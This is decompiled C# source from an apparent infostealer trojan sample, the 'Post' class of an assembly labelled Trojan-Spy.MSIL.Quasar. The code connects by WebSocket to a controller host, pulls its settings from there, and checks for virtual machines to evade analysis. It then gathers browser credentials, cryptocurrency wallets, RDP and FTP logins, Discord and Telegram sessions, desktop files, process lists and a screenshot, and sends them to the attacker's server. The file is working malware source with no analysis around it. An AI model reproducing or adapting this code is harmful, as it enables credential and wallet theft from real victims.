// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Srv.Post
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.Recovery;
using NoiseMe.Drags.App.Models;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Communication;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.Delegates;
using NoiseMe.Drags.App.Models.LocalModels;
using NoiseMe.Drags.App.Models.LocalModels.Extensions;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using NoiseMe.Drags.App.Models.Requests;
using NoiseMe.Drags.App.Models.SuperSocket.ClientEngine;
using NoiseMe.Drags.App.Models.WebSocket4Net;
using ProtoBuf.Meta;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Text;
using System.Threading;
using Systematics.Data.WMI;

namespace NoiseMe.Drags.App.Data.Srv
{
  public class Post
  {
    private int _typeIndex = 100;
    public EventHandler OnWorkCompleted;
    private readonly string BuildID;
    private readonly AutoResetEvent telegramFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent discordFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent processesFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent programsFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent browsersFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent walletsFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent rdpsFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent desktopFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent ftpFlag = new AutoResetEvent(false);
    private readonly AutoResetEvent clientInfoFlag = new AutoResetEvent(false);

    public Dictionary<Func<RequestBase, bool>, NoiseMe.Drags.App.Models.Delegates.Action<RequestBase, WebSocket>> Handlers { get; }

    public string Host { get; }

    public WebSocket Server { get; }

    public bool Running { get; private set; }

    public IList<GH9kf<BrowserProfile>> BrowserCredentialsManagers { get; }

    public IList<GH9kf<ColdWallet>> ColdWalletManagers { get; }

    public IList<GH9kf<RdpCredential>> RdpManagers { get; }

    public IList<GH9kf<FtpCredential>> FtpManagers { get; }

    public IList<gg3> DesktopFileManagers { get; }

    public Post(string IP, string buildID)
    {
      RuntimeTypeModel.Default.AutoAddMissingTypes = true;
      this.AddTypesToSerializer(typeof (CommunicationObject), typeof (RequestBase), typeof (ResponseBase));
      this.AddTypeToSerializer(typeof (RequestBase), typeof (Request<CredentialsRequest>));
      this.AddTypeToSerializer(typeof (RequestBase), typeof (Request<string>));
      this.AddTypeToSerializer(typeof (ResponseBase), typeof (Response<bool>));
      this.AddTypeToSerializer(typeof (ResponseBase), typeof (Response<ClientSettings>));
      this.BrowserCredentialsManagers = (IList<GH9kf<BrowserProfile>>) new List<GH9kf<BrowserProfile>>()
      {
        (GH9kf<BrowserProfile>) new Bip(),
        (GH9kf<BrowserProfile>) new hhhh6r()
      };
      this.ColdWalletManagers = (IList<GH9kf<ColdWallet>>) new List<GH9kf<ColdWallet>>()
      {
        (GH9kf<ColdWallet>) new ColdIndetifier()
      };
      this.RdpManagers = (IList<GH9kf<RdpCredential>>) new List<GH9kf<RdpCredential>>()
      {
        (GH9kf<RdpCredential>) new j6cd()
      };
      this.FtpManagers = (IList<GH9kf<FtpCredential>>) new List<GH9kf<FtpCredential>>()
      {
        (GH9kf<FtpCredential>) new gg3d()
      };
      this.DesktopFileManagers = (IList<gg3>) new List<gg3>()
      {
        new gg3()
      };
      this.BuildID = buildID;
      this.Handlers = new Dictionary<Func<RequestBase, bool>, NoiseMe.Drags.App.Models.Delegates.Action<RequestBase, WebSocket>>();
      this.Host = string.Format("ws://{0}/websocket", (object) IP);
      this.Server = new WebSocket(this.Host)
      {
        AutoSendPingInterval = 5000,
        EnableAutoSendPing = true,
        AllowUnstrustedCertificate = true
      };
      this.InitializeSeIntIrver();
      Console.WriteLine("Server is initialized");
    }

    public TaskAction<bool> Piu() => AsyncTask.StartNew<bool>((TaskAction<bool>) (() =>
    {
      this.Server.Open();
      Console.WriteLine("Opening");
      while (!this.Running)
        Thread.Sleep(100);
      return true;
    }));

    public void HandleWorkCompleted()
    {
      EventHandler onWorkCompleted = this.OnWorkCompleted;
      if (onWorkCompleted == null)
        return;
      onWorkCompleted((object) this, (EventArgs) null);
    }

    private void InitializeSeIntIrver()
    {
      this.Running = false;
      this.Server.DataReceived += (EventHandler<NoiseMe.Drags.App.Models.WebSocket4Net.DataReceivedEventArgs>) ((sender, arguments) =>
      {
        try
        {
          if (!arguments.Data.IsNotNull<byte[]>() || arguments.Data.Length == 0)
            return;
          CommunicationObject communicationObject = arguments.Data.DeSerializeProto<CommunicationObject>();
          if (communicationObject is RequestBase requestBase2)
          {
            foreach (KeyValuePair<Func<RequestBase, bool>, NoiseMe.Drags.App.Models.Delegates.Action<RequestBase, WebSocket>> handler in this.Handlers)
            {
              if (handler.Key(requestBase2))
                handler.Value(requestBase2, this.Server);
            }
          }
          if (!(communicationObject is ResponseBase response2))
            return;
          response2.OnResponse();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Invalid JsonMessage data from server. Exception : " + (object) ex);
        }
      });
      this.Server.Opened += (EventHandler) ((sender, eventArgs) => this.Running = true);
      this.Server.MessageReceived += (EventHandler<MessageReceivedEventArgs>) ((sender, message) => Console.WriteLine(message.Message));
      this.Server.Closed += (EventHandler) ((sender, eventArgs) => Console.WriteLine("Closesd: " + (object) eventArgs));
      this.Server.Error += (EventHandler<ErrorEventArgs>) ((sender, eventArgs) => this.Running = false);
    }

    public bool QQu()
    {
      try
      {
        ClientSettings settings = this.RecieveSettings().IsNull<ClientSettings>(new ClientSettings());
        if (settings.AntiVM)
        {
          switch (new VmDetector().GetMachineType())
          {
            case MachineType.Unknown:
            case MachineType.HyperV:
              break;
            default:
              new Quin().Rfs();
              break;
          }
        }
        List<BrowserProfile> browserProfiles = new List<BrowserProfile>();
        List<ColdWallet> wallets = new List<ColdWallet>();
        List<RdpCredential> rdpCredentials = new List<RdpCredential>();
        List<DesktopFile> desktopFiles = new List<DesktopFile>();
        List<FtpCredential> ftpCredentials = new List<FtpCredential>();
        TelegramSession telegramSession = new TelegramSession();
        DiscordSession discordSession = new DiscordSession();
        List<RemoteProcess> processes = new List<RemoteProcess>();
        List<string> programs = new List<string>();
        RemoteClientInformation clientInfo = new RemoteClientInformation();
        ThreadPool.SetMaxThreads(2000, 10000);
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("ClientInfos parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          clientInfo = ClientInfoHelper.Create(this.BuildID);
          stopwatch.Stop();
          this.clientInfoFlag.Set();
          Console.WriteLine(string.Format("ClientInfos has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("Browsers parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          if (settings.GrabBrowserCredentials)
          {
            int countCompleted = 0;
            object locker = new object();
            foreach (GH9kf<BrowserProfile> credentialsManager in (IEnumerable<GH9kf<BrowserProfile>>) this.BrowserCredentialsManagers)
            {
              GH9kf<BrowserProfile> manager = credentialsManager;
              new Thread((ThreadStart) (() =>
              {
                List<BrowserProfile> collection = manager.EnumerateData();
                lock (locker)
                {
                  browserProfiles.AddRange((IEnumerable<BrowserProfile>) collection);
                  ++countCompleted;
                }
              })).Start();
            }
            while (countCompleted != this.BrowserCredentialsManagers.Count)
              ;
          }
          stopwatch.Stop();
          this.browsersFlag.Set();
          Console.WriteLine(string.Format("Browsers has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("ColdWallets parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          if (settings.GrabColdWallets)
          {
            foreach (GH9kf<ColdWallet> coldWalletManager in (IEnumerable<GH9kf<ColdWallet>>) this.ColdWalletManagers)
              wallets.AddRange((IEnumerable<ColdWallet>) coldWalletManager.EnumerateData().IsNull<List<ColdWallet>>(new List<ColdWallet>()));
          }
          stopwatch.Stop();
          this.walletsFlag.Set();
          Console.WriteLine(string.Format("ColdWallets has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("DiscordSession parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          if (settings.GrabDiscord)
            discordSession = fffsa.TempGet();
          stopwatch.Stop();
          this.discordFlag.Set();
          Console.WriteLine(string.Format("DiscordSession has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("Rdps parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          if (settings.GrabRdp)
          {
            foreach (GH9kf<RdpCredential> rdpManager in (IEnumerable<GH9kf<RdpCredential>>) this.RdpManagers)
              rdpCredentials.AddRange((IEnumerable<RdpCredential>) rdpManager.EnumerateData().IsNull<List<RdpCredential>>());
          }
          stopwatch.Stop();
          this.rdpsFlag.Set();
          Console.WriteLine(string.Format("Rdps has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("DesktopFiles parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          if (settings.GrabDesktopFiles)
          {
            foreach (gg3 desktopFileManager in (IEnumerable<gg3>) this.DesktopFileManagers)
            {
              desktopFileManager.GrabberSettings = (IEnumerable<string>) settings.DesktopExtensions;
              desktopFiles.AddRange((IEnumerable<DesktopFile>) desktopFileManager.EnumerateData());
            }
          }
          stopwatch.Stop();
          this.desktopFlag.Set();
          Console.WriteLine(string.Format("DesktopFiles has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("FTPs parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          if (settings.GrabFtp)
          {
            foreach (GH9kf<FtpCredential> ftpManager in (IEnumerable<GH9kf<FtpCredential>>) this.FtpManagers)
              ftpCredentials.AddRange((IEnumerable<FtpCredential>) ftpManager.EnumerateData().IsNull<List<FtpCredential>>());
          }
          stopwatch.Stop();
          this.ftpFlag.Set();
          Console.WriteLine(string.Format("FTPs has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("TelegramSession parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          if (settings.GrabTelegram)
            telegramSession = Fkf83.Fuul();
          stopwatch.Stop();
          this.telegramFlag.Set();
          Console.WriteLine(string.Format("TelegramSession has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("ListOfProcesses parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          processes = ClientInfoHelper.ListOfProcesses();
          stopwatch.Stop();
          this.processesFlag.Set();
          Console.WriteLine(string.Format("ListOfProcesses has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        new Thread((ThreadStart) (() =>
        {
          Console.WriteLine("ListOfPrograms parser has been started");
          Stopwatch stopwatch = new Stopwatch();
          stopwatch.Start();
          programs = ClientInfoHelper.ListOfPrograms();
          stopwatch.Stop();
          this.programsFlag.Set();
          Console.WriteLine(string.Format("ListOfPrograms has been parsed.Elapsed time: {0}", (object) stopwatch.Elapsed));
        })).Start();
        this.telegramFlag.WaitOne();
        this.discordFlag.WaitOne();
        this.processesFlag.WaitOne();
        this.programsFlag.WaitOne();
        this.browsersFlag.WaitOne();
        this.walletsFlag.WaitOne();
        this.rdpsFlag.WaitOne();
        this.desktopFlag.WaitOne();
        this.ftpFlag.WaitOne();
        this.clientInfoFlag.WaitOne();
        Console.WriteLine("CredentialsRequest has been created");
        if (clientInfo == null)
          Environment.Exit(0);
        return this.Server.ProcessRequest<CredentialsRequest, bool>(new CredentialsRequest()
        {
          ClientInformation = clientInfo,
          BrowserProfiles = browserProfiles,
          ColdWallets = wallets,
          RdpConnections = rdpCredentials,
          DesktopFiles = desktopFiles,
          FtpCredentials = ftpCredentials,
          Telegram = telegramSession,
          Discord = discordSession,
          ProcessList = processes,
          InstalledPrograms = programs,
          Screenshot = ClientInfoHelper.CaptureScreen()
        }, "Credentials", 600000)();
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        return false;
      }
    }

    public ClientSettings RecieveSettings()
    {
      ClientSettings clientSettings = this.Server.ProcessRequest<string, ClientSettings>("", "ParseClientSettings", 600000)();
      clientSettings.DesktopExtensions = clientSettings.DesktopExtensions ?? new BindingList<string>();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append("GrabBrowserCredentials: ").Append(clientSettings.GrabBrowserCredentials).AppendLine().Append("GrabColdWallets: ").Append(clientSettings.GrabColdWallets).AppendLine().Append("GrabDesktopFiles: ").Append(clientSettings.GrabDesktopFiles).AppendLine().Append("GrabFtp: ").Append(clientSettings.GrabFtp).AppendLine().Append("GrabRdp: ").Append(clientSettings.GrabRdp).AppendLine().Append("GrabDiscord: ").Append(clientSettings.GrabDiscord).AppendLine().Append("GrabTelegram: ").Append(clientSettings.GrabTelegram).AppendLine().Append("AntiVM: ").Append(clientSettings.AntiVM).AppendLine().Append("Extensions: ").AppendLine(string.Join(new string(new char[1]
      {
        ','
      }), clientSettings.DesktopExtensions.ToArray<string>()));
      Console.WriteLine(stringBuilder.ToString());
      return clientSettings.IsNull<ClientSettings>(new ClientSettings());
    }

    public void AddTypeToSerializer(Type parent, Type type)
    {
      if ((object) type == null || (object) parent == null)
        throw new ArgumentNullException();
      if (((IEnumerable<SubType>) RuntimeTypeModel.Default[parent].GetSubtypes()).Any<SubType>((Func<SubType, bool>) (subType => (object) subType.DerivedType.Type == (object) type)))
        return;
      RuntimeTypeModel.Default[parent].AddSubType(this._typeIndex++, type);
    }

    public void AddTypesToSerializer(Type parent, params Type[] types)
    {
      foreach (Type type in types)
        this.AddTypeToSerializer(parent, type);
    }
  }
}
